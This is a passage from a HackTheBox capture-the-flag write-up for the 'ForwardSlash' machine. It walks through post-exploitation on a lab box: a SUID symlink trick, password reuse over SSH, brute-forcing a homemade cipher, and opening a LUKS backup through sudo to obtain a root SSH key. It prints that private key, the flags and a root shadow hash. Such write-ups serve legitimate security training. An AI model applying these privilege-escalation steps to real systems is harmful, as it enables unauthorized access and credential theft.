</code></pre><p>Let&rsquo;s try to enumerate more with the help of linPEAS (from [PEASS][PEASS]).</p><p>We have <code>/usr/share/peass/linPEAS/linpeas.sh</code>, let&rsquo;s just serve it via HTTP:</p><pre tabindex=0><code>$ ruby -run -e httpd /usr/share/peass/linPEAS/ -p 8888
[2020-07-05 20:13:39] INFO  WEBrick 1.6.0
[2020-07-05 20:13:39] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]
[2020-07-05 20:13:39] INFO  WEBrick::HTTPServer#start: pid=117003 port=8888
</code></pre><p>Now let&rsquo;s download it on the box:</p><pre tabindex=0><code>chiv@forwardslash:/tmp/cyfun$ wget http://10.10.15.32:8888/linpeas.sh
chiv@forwardslash:/tmp/cyfun$ chmod u+x linpeas.sh
</code></pre><p>In the SUID section we can see an unusual <code>/usr/bin/backup</code>.</p><pre tabindex=0><code>chiv@forwardslash:~$ ls -lh /usr/bin/backup
-r-sr-xr-x 1 pain pain 14K Mar  6 10:06 /usr/bin/backup
</code></pre><h3 id=privilege-escalation--from-chiv-to-pain>Privilege Escalation : from chiv to pain<a hidden class=anchor aria-hidden=true href=#privilege-escalation--from-chiv-to-pain>#</a></h3><p><code>backup</code> is owned by pain.</p><p>Let&rsquo;s try to run it:</p><pre tabindex=0><code>chiv@forwardslash:~$ backup
----------------------------------------------------------------------
        Pain&#39;s Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet,
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 18:37:43
ERROR: 01430555472f086a6633fad6bfc18d98 Does Not Exist or Is Not Accessible By Me, Exiting...
</code></pre><p>There is a hash in the error output, let&rsquo;s identify the hash type with :</p><pre tabindex=0><code>$ haiti 01430555472f086a6633fad6bfc18d98
MD2 [JtR: md2]
MD5 [HC: 0] [JtR: raw-md5]
MD4 [HC: 900] [JtR: raw-md4]
Double MD5 [HC: 2600]
LM [HC: 3000] [JtR: lm]
RIPEMD-128 [JtR: ripemd-128]
Haval-128 [JtR: haval-128-4]
Tiger-128
Skein-256(128)
Skein-512(128)
Lotus Notes/Domino 5 [HC: 8600] [JtR: lotus5]
Skype [HC: 23]
Snefru-128 [JtR: snefru-128]
NTLM [HC: 1000] [JtR: nt]
Domain Cached Credentials [HC: 1100] [JtR: mscach]
Domain Cached Credentials 2 [HC: 2100] [JtR: mscach2]
DNSSEC(NSEC3) [HC: 8300]
RAdmin v2.x [HC: 9900] [JtR: radmin]
</code></pre><p>It&rsquo;s most likely a MD5 hash but we can&rsquo;t crack it.</p><p>As it&rsquo;s a <em>Time Based Backup Viewer</em> it&rsquo;s maybe the hash of the timestamp.</p><pre tabindex=0><code>$ printf %s &#39;18:37:43&#39; | md5sum
01430555472f086a6633fad6bfc18d98  -
</code></pre><p>Let&rsquo;s write a script that will create a file like this.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>time<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>date +<span style=color:#e6db74>&#34;%H:%M:%S&#34;</span><span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>hash<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>printf %s $time | md5sum | cut -d <span style=color:#e6db74>&#39; &#39;</span> -f 1<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># create file</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#39;cyfun test&#39;</span> &gt; $hash
</span></span><span style=display:flex><span><span style=color:#75715e># call backup</span>
</span></span><span style=display:flex><span>backup
</span></span></code></pre></div><p>If we execute the script we have no error now and the file is read:</p><pre tabindex=0><code>chiv@forwardslash:/tmp/cyfun$ ./time.sh
----------------------------------------------------------------------
        Pain&#39;s Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet,
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 18:51:46
cyfun test
</code></pre><p>So we can read a file owned by pain now by modifying our scipt:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>time<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>date +<span style=color:#e6db74>&#34;%H:%M:%S&#34;</span><span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>hash<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>printf %s $time | md5sum | cut -d <span style=color:#e6db74>&#39; &#39;</span> -f 1<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># create file</span>
</span></span><span style=display:flex><span>ln -s /var/backups/config.php.bak $hash
</span></span><span style=display:flex><span><span style=color:#75715e># call backup</span>
</span></span><span style=display:flex><span>backup
</span></span></code></pre></div><p>Now we can read <code>/var/backups/config.php.bak</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* Database credentials. Assuming you are running MySQL
</span></span></span><span style=display:flex><span><span style=color:#75715e>server with default setting (user &#39;root&#39; with no password) */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DB_SERVER&#39;</span>, <span style=color:#e6db74>&#39;localhost&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DB_USERNAME&#39;</span>, <span style=color:#e6db74>&#39;pain&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DB_PASSWORD&#39;</span>, <span style=color:#e6db74>&#39;db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DB_NAME&#39;</span>, <span style=color:#e6db74>&#39;site&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* Attempt to connect to MySQL database */</span>
</span></span><span style=display:flex><span>$link <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_connect</span>(<span style=color:#a6e22e>DB_SERVER</span>, <span style=color:#a6e22e>DB_USERNAME</span>, <span style=color:#a6e22e>DB_PASSWORD</span>, <span style=color:#a6e22e>DB_NAME</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Check connection
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span>($link <span style=color:#f92672>===</span> <span style=color:#66d9ef>false</span>){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;ERROR: Could not connect. &#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>mysqli_connect_error</span>());
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>Again let&rsquo;s try credential stuffing on SSH:</p><pre tabindex=0><code>$ ssh pain@forwardslash.htb
pain@forwardslash.htb&#39;s password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  5 19:12:12 UTC 2020

  System load:  0.0                Processes:            174
  Usage of /:   30.8% of 19.56GB   Users logged in:      1
  Memory usage: 11%                IP address for ens33: 10.10.10.183
  Swap usage:   0%

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Mar  5 14:22:04 2020 from 192.168.56.1
pain@forwardslash:~$ cat user.txt
dd552dcd5a367ea132ee2f017dc5a02d
</code></pre><h3 id=decrypting-the-ciphertext>Decrypting the ciphertext<a hidden class=anchor aria-hidden=true href=#decrypting-the-ciphertext>#</a></h3><p>We can run some commands as root:</p><pre tabindex=0><code>pain@forwardslash:~/encryptorinator$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
</code></pre><p>Let&rsquo;s see what is in pain home directory:</p><pre tabindex=0><code>pain@forwardslash:~$ ls -lhA
total 40K
lrwxrwxrwx 1 pain root    9 Mar  6 09:43 .bash_history -&gt; /dev/null
-rw-r--r-- 1 pain pain  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 pain pain 3.7K Apr  4  2018 .bashrc
drwx------ 2 pain pain 4.0K Mar  5 14:22 .cache
drwxr-xr-x 2 pain root 4.0K Mar 24 12:06 encryptorinator
drwx------ 3 pain pain 4.0K Mar  5 14:22 .gnupg
drwxrwxr-x 3 pain pain 4.0K Mar  6 14:23 .local
-rw-r--r-- 1 pain root  256 Jun  3  2019 note.txt
-rw-r--r-- 1 pain pain  807 Apr  4  2018 .profile
drwx------ 2 pain pain 4.0K Mar 17 20:29 .ssh
-rw------- 1 pain pain   33 Jul  5 18:34 user.txt
</code></pre><p>There is a note file talking about a crypto software.</p><pre tabindex=0><code>pain@forwardslash:~$ cat note.txt
Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.

-chiv
pain@forwardslash:~$ ls -lhA encryptorinator/
total 8.0K
-rw-r--r-- 1 pain root 165 Jun  3  2019 ciphertext
-rw-r--r-- 1 pain root 931 Jun  3  2019 encrypter.py
</code></pre><p>Also it seems that pain is in the <code>backupoperator</code> group.</p><pre tabindex=0><code>pain@forwardslash:~$ id
uid=1000(pain) gid=1000(pain) groups=1000(pain),1002(backupoperator)
</code></pre><p>So we can now see what is in <code>/var/backups/recovery/</code>:</p><pre tabindex=0><code>pain@forwardslash:~$ ls -lhA /var/backups/recovery/encrypted_backup.img
-rw-r----- 1 root backupoperator 954M Mar 24 12:12 /var/backups/recovery/encrypted_backup.img
</code></pre><p>An encrypted backup! We must take a look to the crypto-soft to break that.</p><p>Let&rsquo;s look a this ugly python script <code>encrypter.py</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encrypt</span>(key, msg):
</span></span><span style=display:flex><span>    key <span style=color:#f92672>=</span> list(key)
</span></span><span style=display:flex><span>    msg <span style=color:#f92672>=</span> list(msg)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> char_key <span style=color:#f92672>in</span> key:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(msg)):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>                tmp <span style=color:#f92672>=</span> ord(msg[i]) <span style=color:#f92672>+</span> ord(char_key) <span style=color:#f92672>+</span> ord(msg[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                tmp <span style=color:#f92672>=</span> ord(msg[i]) <span style=color:#f92672>+</span> ord(char_key) <span style=color:#f92672>+</span> ord(msg[i<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> tmp <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>255</span>:
</span></span><span style=display:flex><span>                tmp <span style=color:#f92672>-=</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>            msg[i] <span style=color:#f92672>=</span> chr(tmp)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(msg)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt</span>(key, msg):
</span></span><span style=display:flex><span>    key <span style=color:#f92672>=</span> list(key)
</span></span><span style=display:flex><span>    msg <span style=color:#f92672>=</span> list(msg)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> char_key <span style=color:#f92672>in</span> reversed(key):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> reversed(range(len(msg))):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>                tmp <span style=color:#f92672>=</span> ord(msg[i]) <span style=color:#f92672>-</span> (ord(char_key) <span style=color:#f92672>+</span> ord(msg[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                tmp <span style=color:#f92672>=</span> ord(msg[i]) <span style=color:#f92672>-</span> (ord(char_key) <span style=color:#f92672>+</span> ord(msg[i<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> tmp <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>                tmp <span style=color:#f92672>+=</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>            msg[i] <span style=color:#f92672>=</span> chr(tmp)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(msg)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print encrypt(<span style=color:#e6db74>&#39;REDACTED&#39;</span>, <span style=color:#e6db74>&#39;REDACTED&#39;</span>)
</span></span><span style=display:flex><span>print decrypt(<span style=color:#e6db74>&#39;REDACTED&#39;</span>, encrypt(<span style=color:#e6db74>&#39;REDACTED&#39;</span>, <span style=color:#e6db74>&#39;REDACTED&#39;</span>))
</span></span></code></pre></div><p>It&rsquo;s a custom block cipher, so the only things that matter is to find the key
lenght and the first character of the key which much more simple than guessing
the exact key. Maybe the beginning for the decrypted text will be messed up
but with luck we won&rsquo;t need it.</p><p>Let&rsquo;s download the ciphertext locally:</p><pre tabindex=0><code>$ scp pain@forwardslash.htb:/home/pain/encryptorinator/ciphertext ./
</code></pre><p>As I am more at ease with Ruby than with Python, I rewrote the <code>decrypt()</code>
method in Ruby and then made a script to bruteforce an approximative key.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env ruby</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt</span>(key, msg)
</span></span><span style=display:flex><span>  key <span style=color:#f92672>=</span> key<span style=color:#f92672>.</span>chars
</span></span><span style=display:flex><span>  msg <span style=color:#f92672>=</span> msg<span style=color:#f92672>.</span>chars
</span></span><span style=display:flex><span>  tmp <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>  key<span style=color:#f92672>.</span>reverse<span style=color:#f92672>.</span>each <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>char_key<span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>    (<span style=color:#ae81ff>0</span><span style=color:#f92672>...</span>msg<span style=color:#f92672>.</span>size)<span style=color:#f92672>.</span>reverse_each <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>i<span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        tmp <span style=color:#f92672>=</span> msg<span style=color:#f92672>[</span>i<span style=color:#f92672>].</span>ord <span style=color:#f92672>-</span> (char_key<span style=color:#f92672>.</span>ord <span style=color:#f92672>+</span> msg<span style=color:#f92672>[-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>].</span>ord)
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>        tmp <span style=color:#f92672>=</span> msg<span style=color:#f92672>[</span>i<span style=color:#f92672>].</span>ord <span style=color:#f92672>-</span> (char_key<span style=color:#f92672>.</span>ord <span style=color:#f92672>+</span> msg<span style=color:#f92672>[</span>i<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>].</span>ord)
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>while</span> tmp <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        tmp <span style=color:#f92672>+=</span> <span style=color:#ae81ff>256</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>      msg<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> tmp<span style=color:#f92672>.</span>chr
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> msg<span style=color:#f92672>.</span>join
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ciphertext <span style=color:#f92672>=</span> <span style=color:#66d9ef>File</span><span style=color:#f92672>.</span>binread(<span style=color:#e6db74>&#39;ciphertext&#39;</span>)
</span></span><span style=display:flex><span>words <span style=color:#f92672>=</span> <span style=color:#f92672>[</span><span style=color:#e6db74>&#39;encrypt&#39;</span>, <span style=color:#e6db74>&#39;key&#39;</span>, <span style=color:#e6db74>&#39;backup&#39;</span>, <span style=color:#e6db74>&#39;password&#39;</span><span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>found_key <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>(<span style=color:#ae81ff>1</span><span style=color:#f92672>..</span><span style=color:#ae81ff>100</span>)<span style=color:#f92672>.</span>each <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>key_length<span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>  (<span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>..</span><span style=color:#e6db74>&#39;z&#39;</span>)<span style=color:#f92672>.</span>each <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>c<span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>    guessed_key <span style=color:#f92672>=</span> c <span style=color:#f92672>*</span> key_length
</span></span><span style=display:flex><span>    d <span style=color:#f92672>=</span> decrypt(guessed_key, ciphertext)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> words<span style=color:#f92672>.</span>any? { <span style=color:#f92672>|</span>word<span style=color:#f92672>|</span> d<span style=color:#f92672>.</span>include?(word) }
</span></span><span style=display:flex><span>      puts <span style=color:#e6db74>&#34;Approximate key: </span><span style=color:#e6db74>#{</span>guessed_key<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>      puts <span style=color:#e6db74>&#34;Partially decrypted text: </span><span style=color:#e6db74>#{</span>d<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>      found_key <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>break</span> <span style=color:#66d9ef>if</span> found_key
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span></code></pre></div><p>Now let&rsquo;s run it:</p><pre tabindex=0><code>$ ruby bf.rb
Approximate key: ttttttttttttttttt
Partially decrypted text: ∩┐╜$7C∩┐╜∩┐╜q8∩┐╜∩┐╜4∩┐╜l&#39;you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf∩┐╜
</code></pre><p>The crypto part is not interesting me so I won&rsquo;t develop the explanation more
than that but you can take a look at <a href="https://www.youtube.com/watch?v=alJa51XylDE">IppSec video</a>
to see the reasoning.</p><h3 id=privilege-escalation--from-pain-to-root>Privilege Escalation : from pain to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation--from-pain-to-root>#</a></h3><pre tabindex=0><code>$ pain@forwardslash:~/encryptorinator$ file /var/backups/recovery/encrypted_backup.img
/var/backups/recovery/encrypted_backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: f2a0906a-c412-48db-8c18-3b72443c1bdf
</code></pre><p>Now it&rsquo;s pretty clear we have to mount the LUKS container with the password we
just found.</p><p>Let&rsquo;s see the commands we can run as root again:</p><pre tabindex=0><code>pain@forwardslash:~/encryptorinator$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
</code></pre><p>First we open the LUKS container and create a mount point.</p><pre tabindex=0><code>pain@forwardslash:~/encryptorinator$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
Enter passphrase for /var/backups/recovery/encrypted_backup.img: cB!6%sdH8Lj^@Y*$C2cf

pain@forwardslash:~/encryptorinator$ mkdir -p /tmp/cyfun2/mnt

pain@forwardslash:~/encryptorinator$ cd /tmp/cyfun2
</code></pre><p>Then we can mount the openned container:</p><pre tabindex=0><code>pain@forwardslash:/tmp/cyfun2$ sudo /bin/mount /dev/mapper/backup ./mnt/
</code></pre><p>The mounted device contains only one file:</p><pre tabindex=0><code>pain@forwardslash:/tmp/cyfun2$ cat mnt/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
-----END RSA PRIVATE KEY-----
</code></pre><p>This must be the root SSH key.</p><pre tabindex=0><code>$ chmod 600 id_rsa_root
$ ssh root@forwardslash.htb -i id_rsa_root
</code></pre><p>Let&rsquo;s grab the loot!</p><pre tabindex=0><code>root@forwardslash:~# cat root.txt
12c0583823e80694824b9dd3e6c2ae93

root@forwardslash:~# cat /etc/shadow | grep root
root:$6$daB3I84E$NnzV4cHTAgWsPGWoBKLO2W6NotitrAk6udeTh0cxvXWHIkDXZQtss13QP2gTgFOMdIYdQ8CtvSxzznHI.nVmW.:18326:0:99999:7:::
</code></pre><p>:
[ffuf]:https://github.com/ffuf/ffuf
[xxeserv]:https://github.com/staaldraad/xxeserv
[PEASS]:https://github.com/carlospolop/PEASS-ng</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/hard/>Hard</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>